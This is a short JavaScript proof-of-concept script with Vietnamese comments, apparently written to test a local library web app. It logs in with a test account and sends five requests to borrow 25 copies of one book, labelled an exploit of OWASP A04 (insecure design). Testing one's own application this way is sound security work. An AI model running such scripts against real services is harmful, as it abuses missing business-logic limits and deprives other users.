import axios from 'axios';
import { CookieJar } from 'tough-cookie';
import { wrapper } from 'axios-cookiejar-support';

// Tạo cookie jar để lưu cookies
const jar = new CookieJar();
const client = wrapper(axios.create({ jar }));

// Hàm đăng nhập và lấy accessToken
async function login() {
    try {
        console.log('Đang đăng nhập...');
        const loginResponse = await client.post(
            'http://localhost:4000/users/login', // Thay bằng http://192.168.1.2:4000/users/login nếu cần
            new URLSearchParams({
                'email': 'tester@example.com',
                'password': '123'
            }),
            {
                headers: {
                    'Content-Type': 'application/x-www-form-urlencoded'
                },
                withCredentials: true // Gửi và nhận cookies
            }
        );

        console.log('Đăng nhập thành công! Status:', loginResponse.status);
        console.log('Headers:', loginResponse.headers);

        // Lấy cookies từ jar
        const cookies = await jar.getCookies('http://localhost:4000');
        const accessTokenCookie = cookies.find(cookie => cookie.key === 'accessToken');
        const accessToken = accessTokenCookie ? accessTokenCookie.value : null;

        if (!accessToken) {
            throw new Error('Không tìm thấy accessToken trong cookies');
        }

        console.log('Access Token:', accessToken);
        return accessToken;
    } catch (error) {
        console.error('Lỗi khi đăng nhập:');
        console.error('Status:', error.response ? error.response.status : 'N/A');
        console.error('Data:', error.response ? error.response.data : error.message);
        throw error;
    }
}

// Hàm gửi yêu cầu mượn sách
async function borrowBooks(accessToken) {
    try {
        console.log('\nĐang gửi yêu cầu mượn sách...');
        for (let i = 0; i < 5; i++) {
            const borrowResponse = await client.post(
                'http://localhost:4000/borrows', // Thay bằng http://192.168.1.2:4000/borrows nếu cần
                new URLSearchParams({
                    'bookId': '680163f63d04db8d6d7d4607',
                    'quantity': '25'
                }),
                {
                    headers: {
                        'Content-Type': 'application/x-www-form-urlencoded',
                        'Authorization': `Bearer ${accessToken}`
                    },
                    withCredentials: true
                }
            );

            console.log(`Yêu cầu mượn sách lần ${i + 1}: Status ${borrowResponse.status}`);
            console.log('Response:', borrowResponse.data.slice(0, 200) + '...');
        }
    } catch (error) {
        console.error('Lỗi khi gửi yêu cầu mượn sách:');
        console.error('Status:', error.response ? error.response.status : 'N/A');
        console.error('Data:', error.response ? error.response.data : error.message);
        throw error;
    }
}

// Hàm chính
async function exploitA04() {
    try {
        // Đăng nhập và lấy token
        const accessToken = await login();

        // Gửi yêu cầu mượn sách
        await borrowBooks(accessToken);

        console.log('\nKhai thác A04 hoàn tất! Kiểm tra /borrows/admin để xem yêu cầu mượn.');
    } catch (error) {
        console.error('Khai thác thất bại:', error.message);
    }
}

// Chạy script
exploitA04();